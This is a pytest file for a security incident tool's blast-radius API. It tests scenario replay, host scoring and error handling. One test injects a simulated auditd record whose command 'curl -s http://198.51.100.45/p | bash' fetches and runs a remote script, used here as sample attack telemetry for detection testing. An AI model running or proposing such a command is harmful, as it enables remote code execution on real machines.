"""Route-level tests for GET /api/incidents/{id}/blast-radius.

Uses the same TestClient fixture pattern as test_scenarios.py (conftest `client`).
"""
from __future__ import annotations

import pytest


def test_blast_radius_404_on_unknown_incident(client):
    """Non-existent incident returns 404."""
    r = client.get("/api/incidents/INC-DOES-NOT-EXIST/blast-radius")
    assert r.status_code == 404


def test_blast_radius_scenario1_returns_200_with_hosts(client):
    """Scenario 1 (SSH Compromise) incident blast-radius returns 200 with host entries."""
    client.post("/api/scenarios/clear")
    replay = client.post("/api/scenarios/SCENARIO_1_SSH_COMPROMISE/replay").json()
    incident_id = replay["incident_id"]

    r = client.get(f"/api/incidents/{incident_id}/blast-radius")
    assert r.status_code == 200

    data = r.json()
    assert data["incident_id"] == incident_id
    assert isinstance(data["hosts"], list)
    assert len(data["hosts"]) >= 1


def test_blast_radius_target_web_01_score_positive(client):
    """target-web-01 host must have a positive blast radius score (it has reachable nodes)."""
    client.post("/api/scenarios/clear")
    replay = client.post("/api/scenarios/SCENARIO_1_SSH_COMPROMISE/replay").json()
    incident_id = replay["incident_id"]

    r = client.get(f"/api/incidents/{incident_id}/blast-radius").json()

    # Find the target-web-01 entry
    web_entry = next((h for h in r["hosts"] if h["host"] == "target-web-01"), None)
    assert web_entry is not None, (
        f"Expected 'target-web-01' in hosts, got: {[h['host'] for h in r['hosts']]}"
    )
    assert web_entry["score"] > 0, (
        f"target-web-01 expected positive blast radius, got {web_entry['score']}"
    )
    # Score should approximately match our hand-computed expectation.
    # target-web-01 can reach: scada-hist-01(w=5,d=1), db-server-01(w=5,d=1),
    # maint-jump-01(w=4,d=1), site-01-app-01(w=4,d=2), ...
    # Must be > 10 given the high-weight neighbours.
    assert web_entry["score"] > 10, (
        f"target-web-01 blast radius suspiciously low: {web_entry['score']}"
    )


def test_blast_radius_contributing_nodes_structure(client):
    """Each contributing_node entry has the expected keys and valid value types."""
    client.post("/api/scenarios/clear")
    replay = client.post("/api/scenarios/SCENARIO_1_SSH_COMPROMISE/replay").json()
    incident_id = replay["incident_id"]

    r = client.get(f"/api/incidents/{incident_id}/blast-radius").json()
    web_entry = next((h for h in r["hosts"] if h["host"] == "target-web-01"), None)
    assert web_entry is not None

    for node in web_entry["contributing_nodes"]:
        assert "node" in node and isinstance(node["node"], str)
        assert "weight" in node and 1 <= node["weight"] <= 5
        assert "distance" in node and 1 <= node["distance"] <= 4
        assert "contribution" in node and node["contribution"] > 0


def test_blast_radius_unknown_host_in_graph_returns_zero_not_error(client):
    """Hosts in the incident graph but not in topology (e.g. IP addresses) get score=0 and accurate error."""
    client.post("/api/scenarios/clear")
    replay = client.post("/api/scenarios/SCENARIO_1_SSH_COMPROMISE/replay").json()
    incident_id = replay["incident_id"]

    r = client.get(f"/api/incidents/{incident_id}/blast-radius").json()
    # 127.0.0.1 is a target_host in the graph but not in topology
    ip_entry = next((h for h in r["hosts"] if h["host"] == "127.0.0.1"), None)
    if ip_entry is not None:
        assert ip_entry["score"] == 0.0
        assert ip_entry["contributing_nodes"] == []
        assert ip_entry.get("error") == "Target host is not mapped to the configured topology."


def test_blast_radius_live_incident_with_aliased_target(client):
    """A live-ingested incident targeting target-linux-01 gets computed blast radius via alias."""
    # Ingest a live auditd event for target-linux-01
    auditd_rec = {
        "type": "EXECVE",
        "msg": "audit(1705284000.123:9901)",
        "argc": 3,
        "a0": "/bin/bash",
        "a1": "-c",
        "a2": "curl -s http://198.51.100.45/p | bash",
        "exe": "/bin/bash",
        "auid": "1000",
        "uid": "0",
        "host": "target-linux-01",
    }
    ingest_res = client.post("/api/ingest/raw", json={
        "source_type": "auditd_execve",
        "records": [auditd_rec],
        "site_id": "site-01",
    }).json()
    incident_id = ingest_res.get("incident_id")
    assert incident_id, f"Expected incident_id from live ingest, got {ingest_res}"

    r = client.get(f"/api/incidents/{incident_id}/blast-radius")
    assert r.status_code == 200
    data = r.json()
    host_entry = next((h for h in data["hosts"] if h["host"] == "target-linux-01"), None)
    assert host_entry is not None, f"Expected target-linux-01 in {data['hosts']}"
    assert host_entry["score"] > 10.0
    assert len(host_entry["contributing_nodes"]) > 0
    assert host_entry.get("canonical_host") == "target-web-01"


def test_blast_radius_empty_target_hosts(client):
    """An incident graph with no target_host nodes returns empty hosts array, not 404."""
    # Create incident with empty graph
    from sqlmodel import Session
    from app.database import engine
    from app.models import Incident
    with Session(engine) as session:
        inc = Incident(
            incident_id="INC-EMPTY-GRAPH-TEST",
            title="Test Empty Incident",
            status="open",
            risk_score=10.0,
            confidence=0.5,
            mission_impact="low",
            graph_json={"nodes": [{"id": "user:test", "type": "user", "data": {"label": "test"}}], "edges": []},
            source="demo"
        )
        session.add(inc)
        session.commit()

    r = client.get("/api/incidents/INC-EMPTY-GRAPH-TEST/blast-radius")
    assert r.status_code == 200
    data = r.json()
    assert data["incident_id"] == "INC-EMPTY-GRAPH-TEST"
    assert data["hosts"] == []
